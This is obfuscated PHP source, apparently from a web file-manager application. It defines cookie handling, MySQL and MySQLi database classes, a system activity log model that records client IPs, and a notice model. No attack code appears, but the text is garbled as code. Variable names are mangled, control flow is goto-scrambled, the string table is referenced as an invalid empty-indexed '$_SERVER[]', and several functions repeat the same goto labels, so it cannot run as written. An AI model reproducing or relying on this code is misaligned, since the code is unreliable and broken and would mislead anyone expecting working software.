$_SERVER[]; $E = $dւ[$c[354]]; $C􅜖 = array_to_keyvalue($E, $c[33], $c[369]); goto Cӟ; C㐃Å: return $dւ; goto aڟҒ; b뛧ެ: $C􅜖 = array_unique($C􅜖); $Dԧ檨 = array_unique(array_to_keyvalue($E, $c[33], $c[1437])); $C£ = Model($c[479])->userListInfo($Dԧ檨); goto eɡ; aڟҒ: } public function removeBySource($c) { $C = array($_SERVER[][383] => $c); $this->where($C)->remove(); } } goto F֨; D: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A೨񹦫 = '', $eࠓġ = 0) { if (is_string($A೨񹦫) && $A೨񹦫 != $_SERVER[][33]) { $this->prefix = $A೨񹦫; } if (is_numeric($eࠓġ) && $eࠓġ > 0) { $this->expire = $eࠓġ; } } public static function getInstance() { static $C܉; if ($C܉ === null) { $C܉ = new self(); } return $C܉; } private static $sameCookieSet = array(); public static function set($e, $Eڅ, $F = 0, $bܚ = false, $Dᇉ = false) { goto F䶎; B: self::$sameCookieSet[$e] = $Eڅ . $F; if (!$Dᇉ) { $Dᇉ = str_replace(HOST, $B茙[33], APP_HOST); $Dᇉ = _get($GLOBALS, $B茙[798], $Dᇉ); } $c밪 = $B茙[33]; goto A; F䶎: $B茙 =& $_SERVER[]; if (!$F) { $F = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$e]) && self::$sameCookieSet[$e] == $Eڅ . $F) { return; } goto B; A: setcookie($e, $Eڅ, time() + $F, $B茙[8] . trim($Dᇉ, $B茙[8]) . $c밪, !1, !1, $bܚ); goto d׶; d׶: } public static function setSafe($E, $Fט, $a虐 = 0) { self::set($E, $Fט, $a虐, !0); } public static function get($a) { return isset($_COOKIE[$a]) ? $_COOKIE[$a] : !1; } public static function remove($C،, $F綟 = false) { unset($_COOKIE[$C،]); self::set($C،, $_SERVER[][33], 1, $F綟); } } class DbMysql extends Db { public function __construct($aړۗ = '') { $fؔ =& $_SERVER[]; if (!extension_loaded($fؔ[726])) { think_exception(think_lang($fؔ[10]) . $fؔ[799]); } if (!empty($aړۗ)) { $this->config = $aړۗ; if (empty($this->config[$fؔ[13]])) { $this->config[$fؔ[13]] = $fؔ[33]; } } } public function connect($B۵ = '', $a⡃ = 0, $C߾ = false) { $E =& $_SERVER[]; if (!isset($this->linkID[$a⡃])) { goto B; B: if (empty($B۵)) { $B۵ = $this->config; } $Aʕʖ = $B۵[$E[800]] . ($B۵[$E[801]] ? "\x3a{$B۵[$E[801]]}" : $E[33]); $d = !empty($B۵[$E[13]][$E[14]]) ? $B۵[$E[13]][$E[14]] : $this->pconnect; goto Aᶽ; aǌ: mysql_query($E[804] . think_config($E[805]) . $E[55], $this->linkID[$a⡃]); if ($Cݧ > $E[806]) { mysql_query($E[807], $this->linkID[$a⡃]); } $this->connected = !0; goto E紇; Aᶽ: if ($d) { $this->linkID[$a⡃] = mysql_pconnect($Aʕʖ, $B۵[$E[802]], $B۵[$E[803]], 131072); } else { $this->linkID[$a⡃] = mysql_connect($Aʕʖ, $B۵[$E[802]], $B۵[$E[803]], !0, 131072); } if (!$this->linkID[$a⡃] || !empty($B۵[$E[17]]) && !mysql_select_db($B۵[$E[17]], $this->linkID[$a⡃])) { think_exception(mysql_error()); } $Cݧ = mysql_get_server_info($this->linkID[$a⡃]); goto aǌ; E紇: if (1 != think_config($E[18])) { unset($this->config); } goto E; E: } return $this->linkID[$a⡃]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eǘ) { goto Bͽ; Bͽ: $B =& $_SERVER[]; if (0 === stripos($eǘ, $B[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CӦ; B: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto a; cՓ: think_action_status($B[19], 1); think_status($B[20]); $this->queryID = mysql_query($eǘ, $this->_linkID); goto B; CӦ: if (!$this->_linkID) { return !1; } $this->queryStr = $eǘ; if ($this->queryID) { $this->free(); } goto cՓ; a: } public function execute($Aڏ) { goto Aܢ; Aܢ: $C㓬з =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B; B: $this->queryStr = $Aڏ; if ($this->queryID) { $this->free(); } think_action_status($C㓬з[21], 1); goto eɵ; eɵ: think_status($C㓬з[20]); $Fŉ = mysql_query($Aڏ, $this->_linkID); $this->debug(); goto Aͭ; Aͭ: if (!1 === $Fŉ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto B; B: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][808], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eᷫ = mysql_query($_SERVER[][809], $this->_linkID); $this->transTimes = 0; if (!$Eᷫ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dʇ = mysql_query($_SERVER[][810], $this->_linkID); $this->transTimes = 0; if (!$Dʇ) { $this->error(); return !1; } } return !0; } private function getAll() { $B· = array(); if ($this->numRows > 0) { while ($Cқ = mysql_fetch_assoc($this->queryID)) { $B·[] = $Cқ; } mysql_data_seek($this->queryID, 0); } return $B·; } public function getFields($bŉ) { $A򘡣 =& $_SERVER[]; $d = $this->query($A򘡣[811] . $this->parseKey($bŉ)); $a = array(); if ($d) { foreach ($d as $d˪ => $f) { $a[$f[$A򘡣[27]]] = array($A򘡣[28] => $f[$A򘡣[27]], $A򘡣[29] => $f[$A򘡣[30]], $A򘡣[31] => (bool) (strtoupper($f[$A򘡣[32]]) === $A򘡣[812]), $A򘡣[34] => $f[$A򘡣[35]], $A򘡣[36] => strtolower($f[$A򘡣[37]]) == $A򘡣[38], $A򘡣[39] => strtolower($f[$A򘡣[40]]) == $A򘡣[41]); } } return $a; } public function getTables($a = '') { $FЋ =& $_SERVER[]; if (!empty($a)) { $Dҍ = $FЋ[813] . $a; } else { $Dҍ = $FЋ[814]; } $aĞ壆 = $this->query($Dҍ); $Eʄ = array(); foreach ($aĞ壆 as $B׶ => $fۯ) { $Eʄ[$B׶] = current($fۯ); } return $Eʄ; } public function replace($AȇƆ, $Eۗ = array()) { $C߶؄ =& $_SERVER[]; foreach ($AȇƆ as $Eҿ => $fՃ) { $Bڴ = $this->parseValue($fՃ); if (is_scalar($Bڴ)) { $bϣ[] = $Bڴ; $aɸԵ[] = $this->parseKey($Eҿ); } } $A֒펾 = $C߶؄[815] . $this->parseTable($Eۗ[$C߶؄[267]]) . $C߶؄[816] . implode($C߶؄[47], $aɸԵ) . $C߶؄[817] . implode($C߶؄[47], $bϣ) . $C߶؄[818]; return $this->execute($A֒펾); } public function insertAll($e, $A = array(), $C = false) { goto d鳾; Aīѥ: $cۉ = array(); foreach ($e as $D療) { $cǦ΋ = array(); foreach ($D療 as $Dك => $Aྐ) { $Aྐ = $this->parseValue($Aྐ); if (is_scalar($Aྐ)) { $cǦ΋[] = $Aྐ; } } $cۉ[] = $Cȯ[248] . implode($Cȯ[47], $cǦ΋) . $Cȯ[818]; } array_walk($F, array($this, $Cȯ[819])); goto c⍜; d鳾: $Cȯ =& $_SERVER[]; if (!is_array($e[0])) { return !1; } $F = array_keys($e[0]); goto Aīѥ; c⍜: $D䋅 = ($C ? $Cȯ[820] : $Cȯ[821]) . $Cȯ[822] . $this->parseTable($A[$Cȯ[267]]) . $Cȯ[816] . implode($Cȯ[47], $F) . $Cȯ[823] . implode($Cȯ[47], $cۉ); return $this->execute($D䋅); goto cϭ; cϭ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $D赹 =& $_SERVER[]; $this->error = mysql_errno() . $D赹[4] . mysql_error($this->_linkID); if ($D赹[33] != $this->queryStr) { $this->error .= LNG($D赹[45]) . $this->queryStr; } think_trace($this->error, $D赹[33], $D赹[46]); return $this->error; } public function escapeString($F) { if ($this->_linkID) { return mysql_real_escape_string($F, $this->_linkID); } else { return mysql_escape_string($F); } } public function parseKey(&$c򹂢, $FŞ = true) { $eƮ =& $_SERVER[]; if ($FŞ) { $c򹂢 = $this->parseKeyCheck($c򹂢); } if ($c򹂢 != $eƮ[176] && !preg_match($eƮ[824], $c򹂢)) { $c򹂢 = $eƮ[825] . trim($c򹂢, $eƮ[825]) . $eƮ[825]; } return $c򹂢; } } class DbMysqli extends Db { public function __construct($dʂ = '') { $Bឫ =& $_SERVER[]; if (!extension_loaded($Bឫ[725])) { think_exception(think_lang($Bឫ[10]) . $Bឫ[826]); } if (!empty($dʂ)) { $this->config = $dʂ; if (empty($this->config[$Bឫ[13]])) { $this->config[$Bឫ[13]] = $Bឫ[33]; } } } public function connect($ḍ = '', $D = 0) { $Aڣݏ =& $_SERVER[]; if (!isset($this->linkID[$D])) { goto dͼ; AӐ: $e = $this->linkID[$D]->server_version; $this->linkID[$D]->query($Aڣݏ[804] . think_config($Aڣݏ[805]) . $Aڣݏ[55]); if ($e > $Aڣݏ[806]) { $this->linkID[$D]->query($Aڣݏ[807]); } goto EȚć; dͼ: if (empty($ḍ)) { $ḍ = $this->config; } $this->linkID[$D] = new mysqli($ḍ[$Aڣݏ[800]], $ḍ[$Aڣݏ[802]], $ḍ[$Aڣݏ[803]], $ḍ[$Aڣݏ[17]], $ḍ[$Aڣݏ[801]] ? intval($ḍ[$Aڣݏ[801]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto AӐ; EȚć: $this->connected = !0; if (1 != think_config($Aڣݏ[18])) { unset($this->config); } goto aԤ; aԤ: } return $this->linkID[$D]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($E׎) { goto c̳; d: think_status($B͂[20]); $this->queryID = $this->_linkID->query($E׎); if ($this->_linkID->more_results()) { while (($e = $this->_linkID->next_result()) != NULL) { $e->free_result(); } } goto F͑; F͑: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Bʘ; c̳: $B͂ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d; d: $this->queryStr = $E׎; if ($this->queryID) { $this->free(); } think_action_status($B͂[19], 1); goto d; Bʘ: } public function execute($Eٝ) { goto b뙓; B: think_status($f؆[20]); $eوк = $this->_linkID->query($Eٝ); $this->debug(); goto fԍ; fԍ: if (!1 === $eوк) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto c; a̲Й: $this->queryStr = $Eٝ; if ($this->queryID) { $this->free(); } think_action_status($f؆[21], 1); goto B; b뙓: $f؆ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a̲Й; c: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F֙ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$F֙) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DЍ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$DЍ) { $this->error(); return !1; } } return !0; } private function getAll() { $eО = array(); if ($this->numRows > 0) { for ($b = 0; $b < $this->numRows; $b++) { $eО[$b] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $eО; } public function getFields($a) { $dŉ =& $_SERVER[]; $dʐå = $this->query($dŉ[811] . $this->parseKey($a)); $c = array(); if ($dʐå) { foreach ($dʐå as $fĿ => $e͂) { $c[$e͂[$dŉ[27]]] = array($dŉ[28] => $e͂[$dŉ[27]], $dŉ[29] => $e͂[$dŉ[30]], $dŉ[31] => (bool) ($e͂[$dŉ[32]] === $dŉ[33]), $dŉ[34] => $e͂[$dŉ[35]], $dŉ[36] => strtolower($e͂[$dŉ[37]]) == $dŉ[38], $dŉ[39] => strtolower($e͂[$dŉ[40]]) == $dŉ[41]); } } return $c; } public function getTables($Fع = '') { $a =& $_SERVER[]; $Cׅ = !empty($Fع) ? $a[813] . $Fع : $a[814]; $Dԋװ = $this->query($Cׅ); $DŞ܂ = array(); if ($Dԋװ) { foreach ($Dԋװ as $F => $cӅ) { $DŞ܂[$F] = current($cӅ); } } return $DŞ܂; } public function replace($Dҍ, $eތ憡 = array()) { $c亲 =& $_SERVER[]; foreach ($Dҍ as $eˋ => $a) { $A゘ = $this->parseValue($a); if (is_scalar($A゘)) { $BƧ[] = $A゘; $fәڙ[] = $this->parseKey($eˋ); } } $C׃М = $c亲[815] . $this->parseTable($eތ憡[$c亲[267]]) . $c亲[816] . implode($c亲[47], $fәڙ) . $c亲[817] . implode($c亲[47], $BƧ) . $c亲[818]; return $this->execute($C׃М); } public function insertAll($aԞ, $A = array(), $a = false) { goto D󵳎; dהßك: $C݊ = array(); foreach ($aԞ as $B) { $bⱑ = array(); foreach ($B as $a쏃 => $Bϒ㰾ά) { $Bϒ㰾ά = $this->parseValue($Bϒ㰾ά); if (is_scalar($Bϒ㰾ά)) { $bⱑ[] = $Bϒ㰾ά; } } $C݊[] = $Aٶʚ[248] . implode($Aٶʚ[47], $bⱑ) . $Aٶʚ[818]; } array_walk($E, array($this, $Aٶʚ[819])); goto A޺; A޺: $d޾٨ = ($a ? $Aٶʚ[820] : $Aٶʚ[821]) . $Aٶʚ[822] . $this->parseTable($A[$Aٶʚ[267]]) . $Aٶʚ[816] . implode($Aٶʚ[47], $E) . $Aٶʚ[823] . implode($Aٶʚ[47], $C݊); return $this->execute($d޾٨); goto E; D󵳎: $Aٶʚ =& $_SERVER[]; if (!is_array($aԞ[0])) { return !1; } $E = array_keys($aԞ[0]); goto dהßك; E: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b =& $_SERVER[]; $this->error = $this->_linkID->errno . $b[4] . $this->_linkID->error; if ($b[33] != $this->queryStr) { $this->error .= LNG($b[45]) . $this->queryStr; } think_trace($this->error, $b[33], $b[46]); return $this->error; } public function escapeString($a紐) { if ($this->_linkID) { return $this->_linkID->real_escape_string($a紐); } else { return addslashes($a紐); } } public function parseKey(&$c, $aߛȾŤ = true) { $C =& $_SERVER[]; if ($aߛȾŤ) { $c = $this->parseKeyCheck($c); } if ($c != $C[176] && !preg_match($C[824], $c)) { $c = $C[825] . trim($c, $C[825]) . $C[825]; } return $c; } } goto dő; a: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $BՒ =& $_SERVER[]; return array($BՒ[2402] => LNG($BՒ[2403]), $BՒ[2404] => LNG($BՒ[2405]), $BՒ[2047] => LNG($BՒ[2406]), $BՒ[2407] => LNG($BՒ[2408]), $BՒ[2409] => LNG($BՒ[2410]), $BՒ[2411] => LNG($BՒ[2412]), $BՒ[2413] => LNG($BՒ[2414]), $BՒ[2415] => LNG($BՒ[2416]), $BՒ[2078] => LNG($BՒ[2417]), $BՒ[2079] => LNG($BՒ[2418]), $BՒ[2419] => LNG($BՒ[2420]), $BՒ[2421] => LNG($BՒ[2422]), $BՒ[2423] => LNG($BՒ[2424]), $BՒ[2425] => LNG($BՒ[2426]), $BՒ[2076] => LNG($BՒ[2427]), $BՒ[2083] => LNG($BՒ[2428]), $BՒ[2429] => LNG($BՒ[2430]), $BՒ[2431] => LNG($BՒ[2432]), $BՒ[2433] => LNG($BՒ[2434]), $BՒ[2435] => LNG($BՒ[2436]), $BՒ[2086] => LNG($BՒ[2437]), $BՒ[2087] => LNG($BՒ[2438]), $BՒ[2439] => LNG($BՒ[2440]), $BՒ[2441] => LNG($BՒ[2442]), $BՒ[2443] => LNG($BՒ[2444]), $BՒ[2081] => LNG($BՒ[2445]), $BՒ[2446] => LNG($BՒ[2447]), $BՒ[2080] => LNG($BՒ[2448]), $BՒ[2449] => LNG($BՒ[2450]), $BՒ[2451] => LNG($BՒ[2452]), $BՒ[2453] => LNG($BՒ[2453]), $BՒ[2454] => LNG($BՒ[2051]), $BՒ[2455] => LNG($BՒ[2456]), $BՒ[2457] => LNG($BՒ[2458]), $BՒ[2459] => LNG($BՒ[2460]), $BՒ[2461] => LNG($BՒ[2462]), $BՒ[2463] => LNG($BՒ[2464]), $BՒ[2465] => LNG($BՒ[2465]), $BՒ[2466] => LNG($BՒ[2467]), $BՒ[2468] => LNG($BՒ[2469]), $BՒ[2470] => LNG($BՒ[2471]), $BՒ[2472] => LNG($BՒ[2473]), $BՒ[2474] => LNG($BՒ[2475]), $BՒ[2476] => LNG($BՒ[2477])); } private function typeFile() { $B =& $_SERVER[]; $b텱 = array($B[2083] => array($B[2084]), $B[2423] => array($B[2478]), $B[2425] => array($B[2479]), $B[2076] => array($B[2077]), $B[2431] => array(), $B[2433] => array(), $B[2435] => array(), $B[2086] => array($B[2088]), $B[2087] => array($B[2088]), $B[2439] => array($B[2480]), $B[2441] => array($B[2480]), $B[2443] => array($B[2481]), $B[2429] => array($B[2482]), $B[2081] => array($B[2483]), $B[2446] => array($B[2484]), $B[2080] => array($B[2082])); return $b텱; } private function typeAll() { goto D; EÐܝ: foreach ($Cݖғ as $a => $e慎) { $eԲ[$e慎[0]] = $eԲ[$a]; } $eԲ[$e[2088]] = LNG($e[2485]); $eԲ[$e[2480]] = LNG($e[2486]); goto F; F: return $eԲ; goto D; D: $e =& $_SERVER[]; $eԲ = $this->typeList; $Cݖғ = array_filter($this->typeFile()); goto EÐܝ; D: } public function addLog($c, $cּ = array()) { goto D; Bһ: parent::add($cּ); goto BΪ; D: $d֘ =& $_SERVER[]; if (!isset($this->typeList[$c])) { return; } $Cٱ = USER_ID ? USER_ID : (isset($cּ[$d֘[1437]]) ? $cּ[$d֘[1437]] : 0); goto Bݽ֕; Bݽ֕: $C̎Њ = get_client_ip(); if (!$cּ || strlen(json_encode($cּ)) >= 1024) { $cּ = array($d֘[2487] => $C̎Њ); } else { if (is_array($cּ)) { $cּ[$d֘[2487]] = $C̎Њ; } else { $cּ = array($d֘[1036] => $cּ, $d֘[2487] => $C̎Њ); } } $cּ = array($d֘[1427] => Session::sign(), $d֘[1428] => $Cٱ, $d֘[29] => $c, $d֘[1430] => json_encode($cּ)); goto Bһ; BΪ: } public function remove($Eح) { $this->where(array($_SERVER[][385] => $Eح))->delete(); } private function _makeOrder($b = '') { goto eþ; eþ: $F̎ͥº =& $_SERVER[]; $Bڳ = $F̎ͥº[187]; $b饹 = array($F̎ͥº[402] => $F̎ͥº[403], $F̎ͥº[404] => $F̎ͥº[405]); goto Dп󫤣; f˺: return $this->order($b); goto FǇƨ; Dп󫤣: $B = Input::get($F̎ͥº[408], $F̎ͥº[7], $F̎ͥº[2262], array($F̎ͥº[2188], $F̎ͥº[404])); $B = $b饹[$B]; $b = $b . "{$Bڳ}\x20{$B}"; goto f˺; FǇƨ: } public function get($dͭ˒ = '') { goto f; aӘʸ: $bӲ[$E[354]] = $this->logList($bӲ[$E[354]]); return $bӲ; goto A󉆌; e稡: if ($dͭ˒[$E[1437]]) { $DЂ[$E[1437]] = $dͭ˒[$E[1437]]; } if (isset($dͭ˒[$E[701]])) { $BČ = $dͭ˒[$E[701]]; $d쑷 = isset($dͭ˒[$E[449]]) ? $dͭ˒[$E[449]] : time(); $DЂ[$E[187]] = array($E[321], array($BČ, $d쑷)); } if ($dͭ˒[$E[29]]) { $dċߵ = explode($E[47], $dͭ˒[$E[29]]); $D׍ = $this->typeFile(); $Bӷ = array(); foreach ($dċߵ as $e鈒ܧ) { $Bӷ[] = $e鈒ܧ; if (isset($D׍[$e鈒ܧ])) { $Bӷ = array_merge($Bӷ, $D׍[$e鈒ܧ]); } } $Bӷ = array_unique($Bӷ); if ($Bӷ) { $DЂ[$E[29]] = array($E[7], $Bӷ); } } goto eЄ; eЄ: if (!empty($dͭ˒[$E[2487]])) { $DЂ[$E[405]] = array($E[750], "\x25{$dͭ˒[$E[2487]]}\x25"); } $bӲ = $this->_makeOrder()->where($DЂ)->selectPage(); if (empty($bӲ[$E[354]])) { show_json(array(), !0, $bӲ[$E[351]]); } goto aӘʸ; f: $E =& $_SERVER[]; if (!$dͭ˒) { show_json(array()); } $DЂ = array(); goto e稡; A󉆌: } private function ipAddress(&$D) { $Eۮɞ =& $_SERVER[]; if (!empty($D[$Eۮɞ[2487]])) { $eàа = IpLocation::get($D[$Eۮɞ[2487]]); } else { $eàа = LNG($Eۮɞ[2488]); } $D[$Eۮɞ[2489]] = $eàа; } private function descZipDownload($Eǣ, &$b¿) { $bϙ =& $_SERVER[]; if (!isset($Eǣ[$bϙ[2490]])) { return; } $E = json_decode($Eǣ[$bϙ[2490]], !0); foreach ($E as $a񥾵) { if (!IO::init($a񥾵[$bϙ[75]])) { continue; } if (!($cݚת = IO::infoFull($a񥾵[$bϙ[75]]))) { continue; } $Eǣ[$bϙ[75]] = $a񥾵[$bϙ[75]]; $b¿[] = $Eǣ[$bϙ[369]] = $cݚת[$bϙ[369]]; $b¿[] = $Eǣ[$bϙ[2305]] = $cݚת[$bϙ[463]]; break; } return $Eǣ; } private function getSourceList(&$cŔ) { $Aɵ =& $_SERVER[]; $c = array(); foreach ($cŔ as $Fט => $AŦ) { goto Fݿ; Fݿ: $cř՗ = json_decode($AŦ[$Aɵ[405]], !0); if ($AŦ[$Aɵ[29]] == $Aɵ[2079]) { $cř՗ = $this->descZipDownload($cř՗, $c); $cŔ[$Fט][$Aɵ[405]] = json_encode($cř՗); continue; } if (strpos($AŦ[$Aɵ[29]], $Aɵ[2306]) !== 0) { goto Dղ݋; D˞: continue; goto Eϭ; Dղ݋: if (!isset($cř՗[$Aɵ[75]]) || strpos($AŦ[$Aɵ[29]], $Aɵ[2491]) !== 0) { continue; } if (!IO::init($cř՗[$Aɵ[75]])) { continue; } if (!($E󚜧 = IO::infoFull($cř՗[$Aɵ[75]]))) { continue; } goto Dթ; Dթ: $c[] = $cř՗[$Aɵ[369]] = $E󚜧[$Aɵ[369]]; $c[] = $cř՗[$Aɵ[2305]] = $E󚜧[$Aɵ[463]]; $cŔ[$Fט][$Aɵ[405]] = json_encode($cř՗); goto D˞; Eϭ: } goto fȂ; b: if ($cř՗[$Aɵ[29]] == $Aɵ[2313]) { $c[] = $cř՗[$Aɵ[405]][$Aɵ[369]]; } goto Cˤ޳; fȂ: $c[] = $cř՗[$Aɵ[369]]; $c[] = $cř՗[$Aɵ[2305]]; if ($cř՗[$Aɵ[29]] == $Aɵ[494]) { $c[] = $cř՗[$Aɵ[405]][$Aɵ[1009]]; $c[] = $cř՗[$Aɵ[405]][$Aɵ[1010]]; } goto b; Cˤ޳: } if (!$c) { return array(); } return Model($Aɵ[751])->sourceListInfo($c, !0); } private function logList($eՙɒ) { goto Eʒ¬; F: return $f𚺡; goto Bܓ; c: $a܌ = $this->getSourceList($eՙɒ); $e = $this->typeAll(); $f𚺡 = array(); goto CͺȂ; Eʒ¬: $b䍞 =& $_SERVER[]; $bж = array_to_keyvalue($eՙɒ, $b䍞[33], $b䍞[1437]); $E = Model($b䍞[479])->userListInfo(array_unique($bж)); goto c; CͺȂ: $f = array(); foreach ($eՙɒ as $A޼ => $D뾖) { goto Bު; E˲: $D뾖[$b䍞[2261]] = $e; $Dڗ = json_decode($D뾖[$b䍞[405]], !0); $D뾖[$b䍞[2487]] = isset($Dڗ[$b䍞[2487]]) ? $Dڗ[$b䍞[2487]] : $b䍞[33]; goto D; a: unset($D뾖[$b䍞[2494]]); $f𚺡[] = $D뾖; goto b; Bު: $CӒ = $D뾖[$b䍞[29]]; $e = isset($E[$D뾖[$b䍞[1437]]]) ? $E[$D뾖[$b䍞[1437]]] : !1; $c = strpos($CӒ, $b䍞[2492]) === 0 ? LNG($b䍞[2493]) : LNG($b䍞[2488]); goto AР; D: $this->ipAddress($D뾖); if (strpos($CӒ, $b䍞[2306]) === 0 || isset($Dڗ[$b䍞[2305]])) { goto CΫ; CΫ: $Dڗ[$b䍞[391]] = $a܌[$Dڗ[$b䍞[369]]]; $Dڗ[$b䍞[2318]] = $a܌[$Dڗ[$b䍞[2305]]]; if ($Dڗ[$b䍞[29]] == $b䍞[494]) { $Dڗ[$b䍞[405]][$b䍞[1009]] = $a܌[$Dڗ[$b䍞[405]][$b䍞[1009]]]; $Dڗ[$b䍞[405]][$b䍞[1010]] = $a܌[$Dڗ[$b䍞[405]][$b䍞[1010]]]; } goto EąƆ; EąƆ: if ($Dڗ[$b䍞[29]] == $b䍞[2313]) { $Dڗ[$b䍞[405]][$b䍞[369]] = $a܌[$Dڗ[$b䍞[405]][$b䍞[369]]]; } if ($Dڗ[$b䍞[29]] == $b䍞[2074]) { $Dڗ[$b䍞[2318]] = $Dڗ[$b䍞[391]]; $Dڗ[$b䍞[2305]] = $Dڗ[$b䍞[2318]][$b䍞[369]]; $Dڗ[$b䍞[391]] = !1; $Dڗ[$b䍞[369]] = $b䍞[33]; } if ($Dڗ[$b䍞[391]] && $Dڗ[$b䍞[391]][$b䍞[371]] == $b䍞[1082]) { $f[] = $D뾖[$b䍞[367]]; unset($eՙɒ[$A޼]); continue; } goto C՗գ; C՗գ: if ($Dڗ[$b䍞[2318]] && $Dڗ[$b䍞[2318]][$b䍞[371]] == $b䍞[1082]) { $f[] = $D뾖[$b䍞[367]]; unset($eՙɒ[$A޼]); continue; } goto Aٝ; Aٝ: } $D뾖[$b䍞[405]] = $Dڗ; goto a; AР: $D뾖[$b䍞[28]] = isset($e[$b䍞[28]]) ? $e[$b䍞[28]] : LNG($b䍞[2488]); $D뾖[$b䍞[2354]] = isset($e[$b䍞[2354]]) ? $e[$b䍞[2354]] : $b䍞[33]; $D뾖[$b䍞[1343]] = isset($e[$CӒ]) ? $e[$CӒ] : $c; goto E˲; b: } $this->clearSystemPathLog($f); goto F; Bܓ: } private function clearSystemPathLog($b鵳) { $B׃ =& $_SERVER[]; if (count($b鵳) == 0) { return; } $B = array($B׃[367] => array($B׃[7], array_unique($b鵳))); $this->where($B)->delete(); } public function deviceList($Fɂ, $Dҍ = 0) { $aͺ =& $_SERVER[]; $F = array($aͺ[1437] => $Fɂ, $aͺ[187] => array($aͺ[929], $Dҍ), $aͺ[29] => $aͺ[2047]); $Eٺį = array(); $a誾 = $this->field($aͺ[2495])->where($F)->order($aͺ[2316])->limit(50)->select(); foreach ($a誾 as $A => $Aβь) { goto c; c: if ($A > 0 && abs($Aβь[$aͺ[187]] - $a誾[$A - 1][$aͺ[187]]) < 5) { continue; } $c = json_decode($Aβь[$aͺ[405]], !0); $Aβь[$aͺ[2487]] = isset($c[$aͺ[2487]]) ? $c[$aͺ[2487]] : $aͺ[33]; goto f̫ك; a৯: $this->ipAddress($Aβь); $Aβь[$aͺ[405]] = $c; $Eٺį[$eƍ] = $Aβь; goto f; f̫ك: unset($c[$aͺ[2487]]); $eƍ = $this->deviceType($c[$aͺ[2307]]); if (isset($Eٺį[$eƍ])) { continue; } goto a৯; f: } return array_values($Eٺį); } public function deviceType($Aю) { return $Aю; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\x6e\157\164\x69\143\145\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\143\157\156\164\145\x6e\164", "\x61\165\164\150", "\155\x6f\144\x65", "\164\x69\155\145", "\x74\x79\160\145", "\154\145\166\145\154", "\145\156\x61\x62\154\x65", "\163\157\x72\164"); public function listData($eℇ = false, $B = "\163\157\162\x74", $F󰑶 = false) { return parent::listData($eℇ, $B, $F󰑶); } public function add($B) { $E =& $_SERVER[]; $E텠䝚 = time(); if ($B[$E[12]] == $E[2496]) { $E텠䝚 = strtotime($B[$E[190]]); } $B[$E[190]] = $E텠䝚; return parent::insert($B); } public function update($A, $b쩎) { goto C̣; C۞˂: $A = time(); if ($b쩎[$F֎õ[12]] == $F֎õ[2496]) { $A = strtotime($b쩎[$F֎õ[190]]); } $b쩎[$F֎õ[190]] = $A; goto Aٝ; Aٝ: return parent::update($A, $b쩎); goto a˔; C̣: $F֎õ =& $_SERVER[]; $E = $this->listData($A); if (!$E) { return !1; } goto C۞˂; a˔: } public function remove($Eݬ) { $Dᓵ = $this->listData($Eݬ); if (!$Dᓵ || $Dᓵ[$_SERVER[][1082]]) { return !1; } return parent::remove($Eݬ); } public function sort($Aێ, $bऱ) { return parent::update($Aێ, $bऱ); } public function enable($B݂, $bƣ) { return parent::update($B݂, array($_SERVER[][2497] => $bƣ)); } private function initUserOption() { $A׾ =& $_SERVER[]; $this->optionType = $A׾[2498]; $this->modelType = $A׾[2499]; $this->field = array($A׾[2500], $A׾[28], $A׾[190], $A׾[29], $A׾[2501], $A׾[688], $A׾[183]); } public function userNoticeGet($c鳂 = false) { $this->initUserOption(); return parent::listData($c鳂, $_SERVER[][367], !0); } public function userNoticeAdd($eʂ̘) { $c݌ؿ =& $_SERVER[]; $this->initUserOption(); $dѾ = $this->findByKey($c݌ؿ[2500], $eʂ̘[$c݌ؿ[367]]); if ($dѾ) { return !0; } $Bژ = array($c݌ؿ[2500] => $eʂ̘[$c݌ؿ[367]], $c݌ؿ[28] => $eʂ̘[$c݌ؿ[28]], $c݌ؿ[190] => $eʂ̘[$c݌ؿ[190]], $c݌ؿ[29] => isset($eʂ̘[$c݌ؿ[29]]) ? $eʂ̘[$c݌ؿ[29]] : 1, $c݌ؿ[2501] => 